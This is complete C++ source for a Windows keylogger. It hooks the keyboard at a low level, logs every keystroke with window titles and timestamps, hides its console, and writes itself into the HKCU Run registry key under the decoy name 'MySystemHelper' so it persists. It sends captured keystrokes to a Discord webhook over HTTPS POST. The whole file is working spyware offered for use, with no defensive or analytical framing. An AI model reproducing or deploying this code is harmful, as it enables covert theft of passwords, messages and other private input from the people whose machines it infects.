#include <Windows.h>    
#include <iostream>     
#include <string>       
#include <vector>       
#include <ctime>        
#include <thread>       
#include <mutex>        
#include <chrono>       
#include <urlmon.h>     


#pragma comment(lib, "user32.lib")    
#pragma comment(lib, "wininet.lib")   
#pragma comment(lib, "urlmon.lib")    



const std::string WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
const int SEND_INTERVAL_SECONDS = 30; 
const int MAX_BUFFER_SIZE = 100;      


HHOOK _hook;                 
std::string logBuffer;       
std::mutex logMutex;         
bool running = true;         
std::string currentWindowTitle; 


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
void SendToDiscord(const std::string& data);
void LogKey(DWORD vkCode);
void BackgroundSender();
void SetPersistence();
void HideConsole();
std::string GetCurrentWindowTitle();
std::string GetTimestamp();


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HideConsole();      
    SetPersistence();   

    
    std::thread senderThread(BackgroundSender);

    
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
    if (!_hook) {
        
        
        return 1;
    }

    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    
    UnhookWindowsHookEx(_hook);
    running = false;            
    senderThread.join();        
    return 0;
}


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) { 
        KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        LogKey(kbdStruct.vkCode); 
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam); 
}


void LogKey(DWORD vkCode) {
    std::string keyString;
    bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;       
    bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;      

    char buffer[16];
    BYTE keyboard_state[256];
    GetKeyboardState(keyboard_state); 

    
    if (vkCode == VK_BACK)       keyString = "[BACKSPACE]";
    else if (vkCode == VK_RETURN) keyString = "[ENTER]\n"; 
    else if (vkCode == VK_SPACE)  keyString = " ";
    else if (vkCode == VK_TAB)    keyString = "[TAB]";
    else if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) keyString = "[SHIFT]";
    else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) keyString = "[CTRL]";
    else if (vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) keyString = "[ALT]";
    else if (vkCode == VK_CAPITAL) keyString = "[CAPS LOCK]";
    else if (vkCode == VK_ESCAPE) keyString = "[ESC]";
    else if (vkCode == VK_PRIOR) keyString = "[PAGE UP]";
    else if (vkCode == VK_NEXT) keyString = "[PAGE DOWN]";
    else if (vkCode == VK_END) keyString = "[END]";
    else if (vkCode == VK_HOME) keyString = "[HOME]";
    else if (vkCode == VK_LEFT) keyString = "[LEFT ARROW]";
    else if (vkCode == VK_UP) keyString = "[UP ARROW]";
    else if (vkCode == VK_RIGHT) keyString = "[RIGHT ARROW]";
    else if (vkCode == VK_DOWN) keyString = "[DOWN ARROW]";
    else if (vkCode == VK_INSERT) keyString = "[INSERT]";
    else if (vkCode == VK_DELETE) keyString = "[DELETE]";
    else if (vkCode >= VK_F1 && vkCode <= VK_F12) keyString = "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
    else if (vkCode == VK_NUMLOCK) keyString = "[NUM LOCK]";
    else if (vkCode == VK_SCROLL) keyString = "[SCROLL LOCK]";
    else if (vkCode == VK_SNAPSHOT) keyString = "[PRT SC]";
    else if (vkCode == VK_PAUSE) keyString = "[PAUSE]";
    else if (vkCode == VK_LWIN || vkCode == VK_RWIN) keyString = "[WINDOWS KEY]";
    
    else if (vkCode == VK_OEM_PERIOD) keyString = ".";
    else if (vkCode == VK_OEM_COMMA) keyString = ",";
    else if (vkCode == VK_OEM_MINUS) keyString = "-";
    else if (vkCode == VK_OEM_PLUS) keyString = "+";
    else if (vkCode == VK_OEM_1) keyString = ";";
    else if (vkCode == VK_OEM_2) keyString = "/";
    else if (vkCode == VK_OEM_3) keyString = "`";
    else if (vkCode == VK_OEM_4) keyString = "[";
    else if (vkCode == VK_OEM_5) keyString = "\\";
    else if (vkCode == VK_OEM_6) keyString = "]";
    else if (vkCode == VK_OEM_7) keyString = "'";
    else if (vkCode == VK_OEM_102) keyString = "\\"; 
    else {
        
        HKL layout = GetKeyboardLayout(0); 
        int result = ToAsciiEx(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboard_state, (LPWORD)buffer, 0, layout);
        if (result == 1) {
            keyString = (char)buffer[0];
            
            if (isalpha(keyString[0])) {
                if (isCaps ^ isShift) { 
                    keyString = std::toupper(keyString[0]);
                } else {
                    keyString = std::tolower(keyString[0]);
                }
            }
        } else {
            keyString = "[UNKNOWN KEY: " + std::to_string(vkCode) + "]"; 
        }
    }

    std::lock_guard<std::mutex> guard(logMutex); 
    std::string newTitle = GetCurrentWindowTitle();
    if (newTitle != currentWindowTitle) { 
        currentWindowTitle = newTitle;
        logBuffer += "\n[" + GetTimestamp() + "] - Fenêtre: " + currentWindowTitle + "\n"; 
    }
    logBuffer += keyString; 

    
    if (logBuffer.length() >= MAX_BUFFER_SIZE || keyString == "[ENTER]\n") {
        std::string dataToSend = logBuffer; 
        logBuffer.clear(); 
        
        std::thread([dataToSend]() { 
            SendToDiscord(dataToSend);
        }).detach();
    }
}


void SendToDiscord(const std::string& data) {
    
    if (WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE" || data.empty()) {
        
        return;
    }

    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    try {
        
        hInternet = InternetOpen(L"KeyloggerBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) throw std::runtime_error("InternetOpen a échoué.");

        URL_COMPONENTS uc = { 0 };
        uc.dwStructSize = sizeof(uc);
        wchar_t szHostName[256];
        wchar_t szUrlPath[1024];
        uc.lpszHostName = szHostName;
        uc.dwHostNameLength = sizeof(szHostName) / sizeof(szHostName[0]);
        uc.lpszUrlPath = szUrlPath;
        uc.dwUrlPathLength = sizeof(szUrlPath) / sizeof(szUrlPath[0]);

        
        std::wstring wWebhookUrl(WEBHOOK_URL.begin(), WEBHOOK_URL.end());

        
        if (!InternetCrackUrl(wWebhookUrl.c_str(), 0, 0, &uc)) {
            throw std::runtime_error("InternetCrackUrl a échoué.");
        }

        
        hConnect = InternetConnect(hInternet, uc.lpszHostName, uc.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) throw std::runtime_error("InternetConnect a échoué.");

        LPCWSTR headers = L"Content-Type: application/json"; 
        
        hRequest = HttpOpenRequest(hConnect, L"POST", uc.lpszUrlPath, NULL, NULL, &headers, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
        if (!hRequest) throw std::runtime_error("HttpOpenRequest a échoué.");

        
        std::string jsonPayload = "{\"content\": \"" + data + "\"}";

        
        if (!HttpSendRequest(hRequest, headers, (DWORD)wcslen(headers), (LPVOID)jsonPayload.c_str(), (DWORD)jsonPayload.length())) {
            
        }

    } catch (const std::runtime_error& e) {
        
    }

    
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
}


void BackgroundSender() {
    while (running) {
        std::this_thread::sleep_for(std::chrono::seconds(SEND_INTERVAL_SECONDS)); 
        std::lock_guard<std::mutex> guard(logMutex); 
        if (!logBuffer.empty()) {
            std::string dataToSend = logBuffer; 
            logBuffer.clear(); 
            
            std::thread([dataToSend]() {
                SendToDiscord(dataToSend);
            }).detach();
        }
    }
}


void SetPersistence() {
    TCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH); 

    HKEY hKey;
    
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        
        RegSetValueEx(hKey, L"MySystemHelper", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) * sizeof(TCHAR)));
        RegCloseKey(hKey); 
    }
}


void HideConsole() {
    HWND stealth;
    AllocConsole(); 
    stealth = FindWindowA("ConsoleWindowClass", NULL); 
    ShowWindow(stealth, 0); 
}


std::string GetCurrentWindowTitle() {
    HWND hwnd = GetForegroundWindow(); 
    if (hwnd) {
        char wnd_title[256];
        GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title)); 
        return std::string(wnd_title);
    }
    return "Fenêtre Inconnue"; 
}


std::string GetTimestamp() {
    time_t rawtime;
    struct tm * timeinfo;
    char buffer[80];
    time(&rawtime); 
    timeinfo = localtime(&rawtime); 
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", timeinfo); 
    return std::string(buffer);
}
